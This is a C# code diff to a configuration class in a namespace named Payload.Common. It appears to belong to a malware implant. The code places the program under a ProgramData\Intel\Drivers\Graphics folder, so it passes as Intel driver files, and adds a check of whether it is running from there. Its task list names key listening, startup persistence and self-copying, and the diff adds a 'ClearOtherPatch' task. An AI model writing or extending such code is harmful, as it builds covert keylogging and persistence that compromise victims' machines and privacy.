@@ -40,8 +40,17 @@ namespace Payload.Common
             ExeName = System.AppDomain.CurrentDomain.FriendlyName;
             ExeFullName = $"{WorkSpaceDir}\\{ExeName}";
             TargetWorkSpaceDir = $"{System.Environment.GetFolderPath(SpecialFolder.CommonApplicationData)}\\Intel\\Drivers\\Graphics";
-            if(!Directory.Exists(TargetWorkSpaceDir))
+            TargetUpgradeDir = $"{System.Environment.GetFolderPath(SpecialFolder.CommonApplicationData)}\\Intel\\Drivers";
+            if (!Directory.Exists(TargetWorkSpaceDir))
                 Directory.CreateDirectory(TargetWorkSpaceDir);            
+        }
+
+        public bool CheckWorkingTarget()
+        {
+            DirectoryInfo workingDir = new DirectoryInfo(WorkSpaceDir);
+            DirectoryInfo targetDir = new DirectoryInfo(System.Environment.GetFolderPath(SpecialFolder.CommonApplicationData));
+
+            return workingDir.FullName.StartsWith(targetDir.FullName);
         }
 
         public static bool IsRelease(Assembly assembly)
@@ -77,7 +86,8 @@ namespace Payload.Common
             KeyListener,
             ShowStarMenu,
             StartupSetup,
-            CopyItself
+            CopyItself,
+            ClearOtherPatch
         }
 
         public enum EnumTaskPackMode
@@ -98,9 +108,8 @@ namespace Payload.Common
 
         #region Global
         public string WorkSpaceDir;
-        public string TargetWorkSpaceDir;
-        public string ExeName;
-        public string ExeFullName;
+        public string TargetWorkSpaceDir, TargetUpgradeDir;
+        public string ExeFullName, ExeName;
         public int MainSleepInterval = 5 * 1000;
         public EnumAppMode AppMode = Config.IsDebug(Assembly.GetExecutingAssembly())?EnumAppMode.DEBUG:EnumAppMode.JACK;
         #endregion
